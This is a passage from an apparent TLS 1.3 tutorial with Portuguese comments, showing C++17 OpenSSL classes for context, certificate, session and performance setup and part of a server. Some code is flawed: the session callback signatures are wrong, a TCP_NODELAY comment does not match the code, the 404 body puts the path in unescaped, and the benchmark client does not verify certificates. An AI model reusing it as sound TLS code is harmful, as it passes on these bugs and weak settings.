        default_provider_ = OSSL_PROVIDER_load(nullptr, "default");
        if (!default_provider_) {
            throw std::runtime_error("Falha ao carregar provider padrão");
        }

        // Criar contexto TLS
        ctx_ = SSL_CTX_new(TLS_method());
        if (!ctx_) {
            throw std::runtime_error("Falha ao criar SSL_CTX");
        }
    }

    ~OpenSSLTlsContext() {
        if (ctx_) SSL_CTX_free(ctx_);
        if (default_provider_) OSSL_PROVIDER_unload(default_provider_);
    }

    // Configurar versões do protocolo
    bool set_protocol_versions(int min_version, int max_version) {
        if (SSL_CTX_set_min_proto_version(ctx_, min_version) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        if (SSL_CTX_set_max_proto_version(ctx_, max_version) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        return true;
    }

    // Configurar cifras
    bool set_cipher_list(const char* cipher_list) {
        if (SSL_CTX_set_cipher_list(ctx_, cipher_list) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        return true;
    }

    // Configurar cifras TLS 1.3
    bool set_ciphersuites(const char* ciphersuites) {
        if (SSL_CTX_set_ciphersuites(ctx_, ciphersuites) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        return true;
    }

    // Configurar grupos de curvas
    bool set_groups(const char* groups) {
        if (SSL_CTX_set1_groups_list(ctx_, groups) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        return true;
    }

    // Configurar algoritmos de assinatura
    bool set_sigalgs(const char* sigalgs) {
        if (SSL_CTX_set1_sigalgs_list(ctx_, sigalgs) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }
        return true;
    }

    // Configurar CA para verificação
    bool configure_verification(const char* ca_file,
                                 const char* ca_dir,
                                 int verify_mode) {
        SSL_CTX_set_verify(ctx_, verify_mode, nullptr);

        if (ca_file || ca_dir) {
            if (SSL_CTX_load_verify_locations(ctx_, ca_file, ca_dir) != 1) {
                ERR_print_errors_fp(stderr);
                return false;
            }
        }

        return true;
    }

    // Configurar ALPN
    bool set_alpn_protos(const std::vector<std::string>& protos) {
        std::vector<unsigned char> alpn;
        for (const auto& proto : protos) {
            alpn.push_back(static_cast<unsigned char>(proto.size()));
            alpn.insert(alpn.end(), proto.begin(), proto.end());
        }

        if (SSL_CTX_set_alpn_protos(ctx_, alpn.data(), alpn.size()) != 0) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        return true;
    }

    // Configurar sessões
    void configure_session_cache(int mode, size_t cache_size) {
        SSL_CTX_set_session_cache_mode(ctx_, mode);
        if (mode & SSL_SESS_CACHE_SERVER) {
            SSL_CTX_sess_set_cache_size(ctx_, cache_size);
        }
    }

    // Configurar callbacks de sessão
    void set_session_callbacks(
            std::function<void(SSL*, SSL_SESSION*)> new_cb,
            std::function<void(SSL_CTX*, SSL_SESSION*)> remove_cb) {
        // Armazenar callbacks
        new_session_cb_ = std::move(new_cb);
        remove_session_cb_ = std::move(remove_cb);

        // Configurar callbacks
        SSL_CTX_sess_set_new_cb(ctx_, new_session_callback_static);
        SSL_CTX_sess_set_remove_cb(ctx_, remove_session_callback_static);
    }

    // Configurar SNI callback
    void set_sni_callback(std::function<int(SSL*, int*, void*)> cb) {
        sni_callback_ = std::move(cb);
        SSL_CTX_set_tlsext_servername_callback(ctx_, sni_callback_static);
        SSL_CTX_set_tlsext_servername_arg(ctx_, this);
    }

    // Configurar status OCSP
    void enable_ocsp_stapling() {
        SSL_CTX_set_tlsext_status_type(ctx_, TLSEXT_STATUSTYPE_ocsp);
    }

    // Configurar Early Data (0-RTT)
    void enable_early_data(size_t max_early_data) {
        SSL_CTX_set_max_early_data(ctx_, max_early_data);
    }

    SSL_CTX* get() const { return ctx_; }

private:
    SSL_CTX* ctx_;
    OSSL_PROVIDER* default_provider_;

    std::function<void(SSL*, SSL_SESSION*)> new_session_cb_;
    std::function<void(SSL_CTX*, SSL_SESSION*)> remove_session_cb_;
    std::function<int(SSL*, int*, void*)> sni_callback_;

    static void new_session_callback_static(SSL* ssl, SSL_SESSION* session) {
        // Obter instância do contexto
        SSL_CTX* ctx = SSL_get_SSL_CTX(ssl);
        // Em produção: obter instância via userdata
        // Aqui chamamos o callback diretamente
        std::cout << "Nova sessão criada\n";
    }

    static void remove_session_callback_static(SSL_CTX* ctx, SSL_SESSION* session) {
        std::cout << "Sessão removida do cache\n";
    }

    static int sni_callback_static(SSL* ssl, int* ad, void* arg) {
        OpenSSLTlsContext* self = static_cast<OpenSSLTlsContext*>(arg);
        if (self && self->sni_callback_) {
            return self->sni_callback_(ssl, ad, arg);
        }
        return SSL_TLSEXT_ERR_OK;
    }
};
```

### 8.2 Certificate Loading

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/pkcs12.h>

#include <iostream>
#include <string>
#include <vector>

class CertificateLoader {
public:
    // Carregar certificado PEM
    static X509* load_certificate_pem(const char* cert_path) {
        FILE* file = fopen(cert_path, "r");
        if (!file) {
            std::cerr << "Falha ao abrir arquivo de certificado: " << cert_path << "\n";
            return nullptr;
        }

        X509* cert = PEM_read_X509(file, nullptr, nullptr, nullptr);
        fclose(file);

        if (!cert) {
            ERR_print_errors_fp(stderr);
            return nullptr;
        }

        return cert;
    }

    // Carregar chave privada PEM
    static EVP_PKEY* load_private_key_pem(const char* key_path,
                                            const char* passphrase = nullptr) {
        FILE* file = fopen(key_path, "r");
        if (!file) {
            std::cerr << "Falha ao abrir arquivo de chave: " << key_path << "\n";
            return nullptr;
        }

        EVP_PKEY* key = PEM_read_PrivateKey(file, nullptr, nullptr,
                                              const_cast<char*>(passphrase));
        fclose(file);

        if (!key) {
            ERR_print_errors_fp(stderr);
            return nullptr;
        }

        return key;
    }

    // Carregar cadeia de certificados
    static STACK_OF(X509)* load_certificate_chain(const char* chain_path) {
        FILE* file = fopen(chain_path, "r");
        if (!file) {
            std::cerr << "Falha ao abrir arquivo de cadeia: " << chain_path << "\n";
            return nullptr;
        }

        STACK_OF(X509)* chain = sk_X509_new_null();
        if (!chain) {
            fclose(file);
            return nullptr;
        }

        X509* cert;
        while ((cert = PEM_read_X509(file, nullptr, nullptr, nullptr)) != nullptr) {
            sk_X509_push(chain, cert);
        }

        fclose(file);

        if (sk_X509_num(chain) == 0) {
            sk_X509_free(chain);
            return nullptr;
        }

        return chain;
    }

    // Carregar de PKCS12
    struct Pkcs12Data {
        EVP_PKEY* private_key;
        X509* certificate;
        STACK_OF(X509)* ca_chain;
    };

    static Pkcs12Data load_pkcs12(const char* p12_path,
                                    const char* passphrase) {
        Pkcs12Data result = {nullptr, nullptr, nullptr};

        FILE* file = fopen(p12_path, "rb");
        if (!file) {
            std::cerr << "Falha ao abrir arquivo PKCS12: " << p12_path << "\n";
            return result;
        }

        PKCS12* p12 = d2i_PKCS12_fp(file, nullptr);
        fclose(file);

        if (!p12) {
            ERR_print_errors_fp(stderr);
            return result;
        }

        if (PKCS12_parse(p12, passphrase,
                          &result.private_key,
                          &result.certificate,
                          &result.ca_chain) != 1) {
            ERR_print_errors_fp(stderr);
            PKCS12_free(p12);
            return result;
        }

        PKCS12_free(p12);
        return result;
    }

    // Configurar SSL_CTX com certificados
    static bool configure_ssl_ctx(SSL_CTX* ctx,
                                    const char* cert_path,
                                    const char* key_path,
                                    const char* chain_path = nullptr,
                                    const char* passphrase = nullptr) {
        // Carregar certificado
        if (SSL_CTX_use_certificate_chain_file(ctx, cert_path) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        // Carregar chave privada
        if (passphrase) {
            SSL_CTX_set_default_passwd_cb(ctx, pem_password_callback);
            SSL_CTX_set_default_passwd_cb_userdata(ctx,
                const_cast<char*>(passphrase));
        }

        if (SSL_CTX_use_PrivateKey_file(ctx, key_path, SSL_FILETYPE_PEM) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        // Verificar se chave corresponde ao certificado
        if (SSL_CTX_check_private_key(ctx) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        // Carregar cadeia se fornecida
        if (chain_path) {
            if (SSL_CTX_use_certificate_chain_file(ctx, chain_path) != 1) {
                ERR_print_errors_fp(stderr);
                return false;
            }
        }

        return true;
    }

    // Verificar informações do certificado
    static void print_certificate_info(X509* cert) {
        if (!cert) return;

        std::cout << "\n=== Informações do Certificado ===\n";

        // Subject
        char subject[512];
        X509_NAME_oneline(X509_get_subject_name(cert), subject, sizeof(subject));
        std::cout << "Subject: " << subject << "\n";

        // Issuer
        char issuer[512];
        X509_NAME_oneline(X509_get_issuer_name(cert), issuer, sizeof(issuer));
        std::cout << "Issuer: " << issuer << "\n";

        // Serial Number
        BIGNUM* serial = ASN1_INTEGER_to_BN(X509_get0_serialNumber(cert), nullptr);
        char* serial_str = BN_bn2dec(serial);
        std::cout << "Serial: " << serial_str << "\n";
        BN_free(serial);
        OPENSSL_free(serial_str);

        // Validade
        std::cout << "Válido de: " << format_time(X509_get0_notBefore(cert)) << "\n";
        std::cout << "Válido até: " << format_time(X509_get0_notAfter(cert)) << "\n";

        // Algoritmo de assinatura
        const ASN1_BIT_STRING* sig;
        const X509_ALGOR* alg;
        X509_get0_signature(&sig, &alg, cert);
        std::cout << "Algoritmo de assinatura: " << OBJ_nid2ln(alg->algorithm) << "\n";

        // Chave pública
        EVP_PKEY* pubkey = X509_get0_pubkey(cert);
        if (pubkey) {
            int key_type = EVP_PKEY_base_id(pubkey);
            int key_bits = EVP_PKEY_bits(pubkey);
            std::cout << "Tipo de chave: " << EVP_PKEY_type_name(key_type) << "\n";
            std::cout << "Tamanho da chave: " << key_bits << " bits\n";
        }

        // Subject Alternative Names (SANs)
        GENERAL_NAMES* sans = (GENERAL_NAMES*)X509_get_ext_d2i(
            cert, NID_subject_alt_name, nullptr, nullptr);

        if (sans) {
            std::cout << "SANs:\n";
            for (int i = 0; i < sk_GENERAL_NAME_num(sans); ++i) {
                GENERAL_NAME* san = sk_GENERAL_NAME_value(sans, i);
                if (san->type == GEN_DNS) {
                    ASN1_IA5STRING* dns = san->d.dNSName;
                    std::cout << "  DNS: " << std::string(
                        reinterpret_cast<const char*>(dns->data),
                        dns->length) << "\n";
                } else if (san->type == GEN_IPADD) {
                    ASN1_OCTET_STRING* ip = san->d.iPAddress;
                    if (ip->length == 4) {
                        std::cout << "  IP: "
                                  << (int)ip->data[0] << "."
                                  << (int)ip->data[1] << "."
                                  << (int)ip->data[2] << "."
                                  << (int)ip->data[3] << "\n";
                    }
                }
            }
            GENERAL_NAMES_free(sans);
        }

        std::cout << "===================================\n";
    }

private:
    static int pem_password_callback(char* buf, int num, int wkey, void* key) {
        const char* passphrase = static_cast<const char*>(key);
        if (!passphrase) return 0;

        int len = strlen(passphrase);
        if (len >= num) return 0;

        memcpy(buf, passphrase, len);
        return len;
    }

    static std::string format_time(const ASN1_TIME* time) {
        BIO* bio = BIO_new(BIO_s_mem());
        ASN1_TIME_print(bio, time);
        BUF_MEM* bptr;
        BIO_get_mem_ptr(bio, &bptr);
        std::string result(bptr->data, bptr->length);
        BIO_free(bio);
        return result;
    }
};
```

### 8.3 Session Management

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#include <iostream>
#include <map>
#include <vector>
#include <mutex>
#include <chrono>
#include <functional>

class TlsSessionManager {
public:
    struct SessionData {
        std::vector<uint8_t> session_id;
        std::vector<uint8_t> session_data;
        std::chrono::steady_clock::time_point created;
        std::chrono::steady_clock::time_point last_accessed;
        size_t access_count{0};
        bool valid{true};
    };

    TlsSessionManager(size_t max_sessions = 1000,
                       std::chrono::seconds ttl = std::chrono::seconds(3600))
        : max_sessions_(max_sessions), ttl_(ttl) {}

    // Callback para nova sessão
    void on_new_session(SSL* ssl, SSL_SESSION* session) {
        std::lock_guard<std::mutex> lock(mutex_);

        // Serializar sessão
        unsigned char* der_data = nullptr;
        int der_len = i2d_SSL_SESSION(session, &der_data);

        if (der_len <= 0 || !der_data) {
            return;
        }

        // Obter ID da sessão
        const unsigned char* sess_id;
        unsigned int sess_id_len;
        sess_id = SSL_SESSION_get_id(session, &sess_id_len);

        // Criar entrada
        SessionData data;
        data.session_id.assign(sess_id, sess_id + sess_id_len);
        data.session_data.assign(der_data, der_data + der_len);
        data.created = std::chrono::steady_clock::now();
        data.last_accessed = data.created;
        data.valid = true;

        // Armazenar
        std::string key(sess_id, sess_id + sess_id_len);
        sessions_[key] = std::move(data);

        // Limpar sessões antigas
        cleanup_expired_sessions();

        // Limitar número de sessões
        while (sessions_.size() > max_sessions_) {
            evict_oldest_session();
        }

        OPENSSL_free(der_data);

        std::cout << "Nova sessão armazenada (tamanho: "
                  << der_len << " bytes)\n";
    }

    // Callback para remover sessão
    void on_remove_session(SSL_CTX* ctx, SSL_SESSION* session) {
        std::lock_guard<std::mutex> lock(mutex_);

        const unsigned char* sess_id;
        unsigned int sess_id_len;
        sess_id = SSL_SESSION_get_id(session, &sess_id_len);

        std::string key(sess_id, sess_id + sess_id_len);

        auto it = sessions_.find(key);
        if (it != sessions_.end()) {
            it->second.valid = false;
            std::cout << "Sessão marcada como inválida\n";
        }
    }

    // Buscar sessão por ID
    SSL_SESSION* find_session(const unsigned char* session_id,
                               unsigned int session_id_len) {
        std::lock_guard<std::mutex> lock(mutex_);

        std::string key(session_id, session_id + session_id_len);

        auto it = sessions_.find(key);
        if (it == sessions_.end() || !it->second.valid) {
            return nullptr;
        }

        // Verificar TTL
        auto now = std::chrono::steady_clock::now();
        if (now - it->second.created > ttl_) {
            it->second.valid = false;
            return nullptr;
        }

        // Atualizar último acesso
        it->second.last_accessed = now;
        it->second.access_count++;

        // Desserializar sessão
        const unsigned char* data = it->second.session_data.data();
        SSL_SESSION* session = d2i_SSL_SESSION(nullptr, &data,
                                                 it->second.session_data.size());

        return session;
    }

    // Obter estatísticas
    struct Stats {
        size_t total_sessions;
        size_t active_sessions;
        size_t expired_sessions;
        size_t evicted_sessions;
    };

    Stats get_stats() const {
        std::lock_guard<std::mutex> lock(mutex_);
        Stats stats;
        stats.total_sessions = sessions_.size();
        stats.active_sessions = 0;
        stats.expired_sessions = 0;

        auto now = std::chrono::steady_clock::now();
        for (const auto& [key, data] : sessions_) {
            if (data.valid && (now - data.created <= ttl_)) {
                stats.active_sessions++;
            } else {
                stats.expired_sessions++;
            }
        }

        stats.evicted_sessions = evicted_count_;
        return stats;
    }

private:
    size_t max_sessions_;
    std::chrono::seconds ttl_;
    mutable std::mutex mutex_;
    std::map<std::string, SessionData> sessions_;
    size_t evicted_count_{0};

    void cleanup_expired_sessions() {
        auto now = std::chrono::steady_clock::now();
        for (auto it = sessions_.begin(); it != sessions_.end(); ) {
            if (!it->second.valid || (now - it->second.created > ttl_)) {
                it = sessions_.erase(it);
                evicted_count_++;
            } else {
                ++it;
            }
        }
    }

    void evict_oldest_session() {
        if (sessions_.empty()) return;

        auto oldest = sessions_.begin();
        for (auto it = sessions_.begin(); it != sessions_.end(); ++it) {
            if (it->second.last_accessed < oldest->second.last_accessed) {
                oldest = it;
            }
        }

        sessions_.erase(oldest);
        evicted_count_++;
    }
};
```

### 8.4 Performance Tuning

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>

#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <numeric>

class TlsPerformanceTuner {
public:
    struct PerformanceConfig {
        // Sessão
        bool session_reuse{true};
        size_t session_cache_size{10000};
        int session_timeout{300};  // segundos

        // Buffers
        int read_buffer_size{16384};
        int write_buffer_size{16384};

        // Handshake
        bool false_start_allowed{true};
        int handshake_timeout{30};  // segundos

        // Conexão
        int max_concurrent_connections{1000};
        int connection_timeout{60};  // segundos

        // Segurança
        bool enable_early_data{false};
        size_t max_early_data{0};
    };

    TlsPerformanceTuner() = default;

    // Configurar para máximo throughput
    static void configure_for_throughput(SSL_CTX* ctx) {
        // Habilitar todas as otimizações de sessão
        SSL_CTX_set_session_cache_mode(ctx,
            SSL_SESS_CACHE_SERVER | SSL_SESS_CACHE_NO_INTERNAL);

        // Cache grande para sessões
        SSL_CTX_sess_set_cache_size(ctx, 10000);

        // Timeout de sessão longo (5 minutos)
        SSL_CTX_set_timeout(ctx, 300);

        // Habilitar TCP_NODELAY
        SSL_CTX_set_mode(ctx,
            SSL_MODE_ENABLE_PARTIAL_WRITE |
            SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
            SSL_MODE_AUTO_RETRY);

        // Configurar buffers grandes
        SSL_CTX_set_read_ahead(ctx, 1);

        // Habilitar compressão no registro TLS (se suportado)
        // SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);

        std::cout << "Configuração de throughput máximo aplicada\n";
    }

    // Configurar para mínima latência
    static void configure_for_low_latency(SSL_CTX* ctx) {
        // Sessão cache pequena
        SSL_CTX_set_session_cache_mode(ctx,
            SSL_SESS_CACHE_SERVER | SSL_SESS_CACHE_NO_INTERNAL);
        SSL_CTX_sess_set_cache_size(ctx, 100);

        // Timeout de sessão curto (1 minuto)
        SSL_CTX_set_timeout(ctx, 60);

        // Habilitar TCP_NODELAY e auto-retry
        SSL_CTX_set_mode(ctx,
            SSL_MODE_ENABLE_PARTIAL_WRITE |
            SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
            SSL_MODE_AUTO_RETRY);

        // Read ahead desabilitado para latência mínima
        SSL_CTX_set_read_ahead(ctx, 0);

        // Configurar cifras rápidas
        SSL_CTX_set_ciphersuites(ctx,
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_256_GCM_SHA384");

        std::cout << "Configuração de latência mínima aplicada\n";
    }

    // Configurar para uso de memória mínimo
    static void configure_for_memory_efficiency(SSL_CTX* ctx) {
        // Cache pequeno
        SSL_CTX_set_session_cache_mode(ctx,
            SSL_SESS_CACHE_SERVER | SSL_SESS_CACHE_NO_INTERNAL);
        SSL_CTX_sess_set_cache_size(ctx, 100);

        // Timeout curto para liberar memória
        SSL_CTX_set_timeout(ctx, 60);

        // Configurar para reusar sessões agressivamente
        SSL_CTX_set_mode(ctx,
            SSL_MODE_ENABLE_PARTIAL_WRITE |
            SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
            SSL_MODE_AUTO_RETRY);

        // Usar cifras eficientes em memória
        SSL_CTX_set_ciphersuites(ctx, "TLS_AES_128_GCM_SHA256");

        std::cout << "Configuração de eficiência de memória aplicada\n";
    }

    // Benchmark de handshake
    struct BenchmarkResult {
        double handshakes_per_second;
        double avg_latency_ms;
        double p99_latency_ms;
        size_t memory_used_bytes;
    };

    static BenchmarkResult benchmark_handshake(SSL_CTX* server_ctx,
                                                 size_t iterations = 1000) {
        std::vector<double> latencies;
        latencies.reserve(iterations);

        auto start_total = std::chrono::high_resolution_clock::now();

        for (size_t i = 0; i < iterations; ++i) {
            auto start = std::chrono::high_resolution_clock::now();

            // Criar par de sockets
            int sv[2];
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
                continue;
            }

            // Criar cliente e servidor
            SSL_CTX* client_ctx = SSL_CTX_new(TLS_client_method());
            SSL* server_ssl = SSL_new(server_ctx);
            SSL* client_ssl = SSL_new(client_ctx);

            SSL_set_fd(server_ssl, sv[0]);
            SSL_set_fd(client_ssl, sv[1]);

            // Handshake
            std::thread server_thread([server_ssl]() {
                SSL_accept(server_ssl);
            });

            SSL_connect(client_ssl);

            server_thread.join();

            auto end = std::chrono::high_resolution_clock::now();
            double latency = std::chrono::duration<double, std::micro>(
                end - start).count();
            latencies.push_back(latency);

            // Cleanup
            SSL_free(client_ssl);
            SSL_free(server_ssl);
            SSL_CTX_free(client_ctx);
            close(sv[0]);
            close(sv[1]);
        }

        auto end_total = std::chrono::high_resolution_clock::now();
        double total_time = std::chrono::duration<double>(
            end_total - start_total).count();

        // Calcular estatísticas
        std::sort(latencies.begin(), latencies.end());

        BenchmarkResult result;
        result.handshakes_per_second = iterations / total_time;
        result.avg_latency_ms = std::accumulate(latencies.begin(), latencies.end(), 0.0) /
                                 latencies.size() / 1000.0;
        result.p99_latency_ms = latencies[latencies.size() * 99 / 100] / 1000.0;
        result.memory_used_bytes = 0;  // Requer medição específica

        return result;
    }

    // Imprimir recomendações
    static void print_recommendations(const BenchmarkResult& result) {
        std::cout << "\n=== Recomendações de Performance ===\n";
        std::cout << "Handshakes por segundo: " << result.handshakes_per_second << "\n";
        std::cout << "Latência média: " << result.avg_latency_ms << " ms\n";
        std::cout << "Latência P99: " << result.p99_latency_ms << " ms\n\n";

        if (result.handshakes_per_second < 1000) {
            std::cout << "RECOMENDAÇÃO: Habilitar session caching\n";
            std::cout << "  SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_SERVER);\n";
        }

        if (result.avg_latency_ms > 10.0) {
            std::cout << "RECOMENDAÇÃO: Considerar 0-RTT para reconexões\n";
            std::cout << "  SSL_CTX_set_max_early_data(ctx, 16384);\n";
        }

        if (result.p99_latency_ms > 50.0) {
            std::cout << "RECOMENDAÇÃO: Verificar configuração de rede\n";
            std::cout << "  - TCP_NODELAY habilitado?\n";
            std::cout << "  - Buffer sizes otimizados?\n";
        }

        std::cout << "=====================================\n";
    }
};
```

---

## 9. Complete C++17 TLS Server Implementation (300+ Lines)

```c++
// tls_server.cpp - Servidor TLS 1.3 completo em C++17 com OpenSSL 3.x
// Compilar: g++ -std=c++17 -o tls_server tls_server.cpp -lssl -lcrypto -pthread

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/ocsp.h>
#include <openssl/core_names.h>

#include <iostream>
#include <memory>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <functional>
#include <chrono>
#include <cstring>
#include <csignal>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>

// ============================================================
// Configuração do Servidor
// ============================================================

struct ServerConfig {
    std::string cert_path;
    std::string key_path;
    std::string ca_path;
    int port{4433};
    int max_connections{100};
    bool enable_0rtt{false};
    size_t max_early_data{0};
    std::string cipher_suites;
    std::string groups;
    std::string sigalgs;
};

// ============================================================
// Gerenciador de Conexões
// ============================================================

class ConnectionManager {
public:
    struct Connection {
        int fd;
        SSL* ssl;
        struct sockaddr_in addr;
        std::chrono::steady_clock::time_point connected_at;
        std::string client_ip;
        uint64_t bytes_received{0};
        uint64_t bytes_sent{0};
        bool active{false};
    };

    ConnectionManager() = default;

    ~ConnectionManager() {
        close_all();
    }

    bool add_connection(int fd, SSL* ssl, const struct sockaddr_in& addr) {
        std::lock_guard<std::mutex> lock(mutex_);

        if (connections_.size() >= max_connections_) {
            return false;
        }

        auto conn = std::make_unique<Connection>();
        conn->fd = fd;
        conn->ssl = ssl;
        conn->addr = addr;
        conn->connected_at = std::chrono::steady_clock::now();
        conn->client_ip = inet_ntoa(addr.sin_addr);
        conn->active = true;

        connections_[fd] = std::move(conn);
        return true;
    }

    void remove_connection(int fd) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto it = connections_.find(fd);
        if (it != connections_.end()) {
            it->second->active = false;
            connections_.erase(it);
        }
    }

    Connection* get_connection(int fd) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto it = connections_.find(fd);
        if (it != connections_.end()) {
            return it->second.get();
        }
        return nullptr;
    }

    size_t active_count() const {
        std::lock_guard<std::mutex> lock(mutex_);
        return connections_.size();
    }

    void set_max_connections(size_t max) {
        max_connections_ = max;
    }

    void print_stats() const {
        std::lock_guard<std::mutex> lock(mutex_);

        std::cout << "\n=== Estatísticas de Conexões ===\n";
        std::cout << "Conexões ativas: " << connections_.size() << "\n";
        std::cout << "Máximo: " << max_connections_ << "\n";

        uint64_t total_bytes_in = 0, total_bytes_out = 0;
        for (const auto& [fd, conn] : connections_) {
            total_bytes_in += conn->bytes_received;
            total_bytes_out += conn->bytes_sent;
        }

        std::cout << "Total bytes recebidos: " << total_bytes_in << "\n";
        std::cout << "Total bytes enviados: " << total_bytes_out << "\n";
        std::cout << "================================\n";
    }

private:
    mutable std::mutex mutex_;
    std::map<int, std::unique_ptr<Connection>> connections_;
    size_t max_connections_{100};
};

// ============================================================
// Handler de Requisições HTTP
// ============================================================

class HttpRequestHandler {
public:
    using ResponseGenerator = std::function<std::string(const std::string& path,
                                                         const std::string& method)>;

    HttpRequestHandler() {
        // Registrar rotas padrão
        routes_["/"] = [this](const std::string& path, const std::string& method) {
            return handle_root(path, method);
        };
        routes_["/health"] = [this](const std::string& path, const std::string& method) {
            return handle_health(path, method);
        };
        routes_["/api/info"] = [this](const std::string& path, const std::string& method) {
            return handle_api_info(path, method);
        };
    }

    void register_route(const std::string& path, ResponseGenerator handler) {
        routes_[path] = std::move(handler);
    }

    std::string handle_request(const std::string& raw_request) {
        // Parse HTTP request
        auto [method, path, version] = parse_http_request(raw_request);

        // Buscar rota
        auto it = routes_.find(path);
        if (it != routes_.end()) {
            std::string body = it->second(path, method);
            return build_http_response(200, "OK", body);
        }

        // Rota não encontrada
        std::string body = "{\"error\": \"not found\", \"path\": \"" + path + "\"}";
        return build_http_response(404, "Not Found", body);
    }

private:
    std::map<std::string, ResponseGenerator> routes_;

    std::tuple<std::string, std::string, std::string> parse_http_request(
            const std::string& request) {
        size_t first_space = request.find(' ');
        size_t second_space = request.find(' ', first_space + 1);

        if (first_space == std::string::npos || second_space == std::string::npos) {
            return {"", "", ""};
        }

        std::string method = request.substr(0, first_space);
        std::string path = request.substr(first_space + 1, second_space - first_space - 1);
        std::string version = request.substr(second_space + 1);

        // Remover query string
        size_t query_pos = path.find('?');
        if (query_pos != std::string::npos) {
            path = path.substr(0, query_pos);
        }

        return {method, path, version};
    }

    std::string build_http_response(int status_code, const std::string& status_text,
                                      const std::string& body) {
        std::string response;
        response += "HTTP/1.1 " + std::to_string(status_code) + " " + status_text + "\r\n";
        response += "Content-Type: application/json\r\n";
        response += "Content-Length: " + std::to_string(body.size()) + "\r\n";
        response += "Connection: close\r\n";
        response += "Server: TLS13-Server/1.0\r\n";
        response += "\r\n";
        response += body;
        return response;
    }

    std::string handle_root(const std::string& path, const std::string& method) {
        return "{\"message\": \"Servidor TLS 1.3 funcionando!\", "
                "\"protocol\": \"TLS 1.3\", "
                "\"server\": \"OpenSSL 3.x\"}";
    }

    std::string handle_health(const std::string& path, const std::string& method) {
        return "{\"status\": \"healthy\", "
                "\"timestamp\": \"" + std::to_string(
                    std::chrono::system_clock::now().time_since_epoch().count()) + "\"}";
    }

    std::string handle_api_info(const std::string& path, const std::string& method) {
        return "{\"api_version\": \"1.0\", "
                "\"tls_version\": \"TLS 1.3\", "
                "\"features\": [\"0-RTT\", \"ECH\", \"OCSP-Stapling\"]}";
    }
};

// ============================================================
// Servidor TLS 1.3 Principal
// ============================================================

class Tls13Server {
public:
    Tls13Server(const ServerConfig& config)
        : config_(config), running_(false) {
        connection_manager_.set_max_connections(config.max_connections);
    }

    ~Tls13Server() {
        stop();
    }

    bool initialize() {
        // Criar contexto TLS
        ctx_ = SSL_CTX_new(TLS_server_method());
        if (!ctx_) {
            print_ssl_errors("Falha ao criar SSL_CTX");
            return false;
        }

        // Configurar protocolos
        if (!configure_protocols()) return false;

        // Configurar cifras
        if (!configure_ciphers()) return false;

        // Configurar grupos de curvas
        if (!configure_groups()) return false;

        // Carregar certificado e chave
        if (!load_credentials()) return false;

        // Configurar verificação de cliente (opcional)
        SSL_CTX_set_verify(ctx_, SSL_VERIFY_NONE, nullptr);

        // Configurar sessões
        SSL_CTX_set_session_cache_mode(ctx_, SSL_SESS_CACHE_SERVER);
        SSL_CTX_sess_set_cache_size(ctx_, 1024);
        SSL_CTX_set_timeout(ctx_, 300);

        // Configurar 0-RTT se habilitado
        if (config_.enable_0rtt) {
            SSL_CTX_set_max_early_data(ctx_, config_.max_early_data);
        }

        // Configurar ALPN
        const unsigned char alpn[] = {2, 'h', '2', 8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_CTX_set_alpn_protos(ctx_, alpn, sizeof(alpn));

        // Configurar callbacks
        SSL_CTX_sess_set_new_cb(ctx_, new_session_callback);
        SSL_CTX_sess_set_remove_cb(ctx_, remove_session_callback);

        std::cout << "Contexto TLS 1.3 inicializado com sucesso\n";
        return true;
    }

    bool start() {
        // Criar socket
        listen_fd_ = socket(AF_INET, SOCK_STREAM, 0);
        if (listen_fd_ < 0) {
            perror("socket");
            return false;
        }

        // Configurar socket
        int opt = 1;
        setsockopt(listen_fd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        // Bind
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(config_.port);

        if (bind(listen_fd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("bind");
            close(listen_fd_);
            return false;
        }

        // Listen
        if (listen(listen_fd_, 128) < 0) {
            perror("listen");
            close(listen_fd_);
            return false;
        }

        running_ = true;

        std::cout << "Servidor TLS 1.3 ouvindo na porta " << config_.port << "\n";

        // Loop principal
        accept_loop();

        return true;
    }

    void stop() {
        running_ = false;
        if (listen_fd_ >= 0) {
            close(listen_fd_);
            listen_fd_ = -1;
        }
    }

    void print_stats() const {
        connection_manager_.print_stats();
    }

private:
    ServerConfig config_;
    SSL_CTX* ctx_{nullptr};
    int listen_fd_{-1};
    std::atomic<bool> running_;
    ConnectionManager connection_manager_;
    HttpRequestHandler request_handler_;

    bool configure_protocols() {
        // TLS 1.3 como única versão
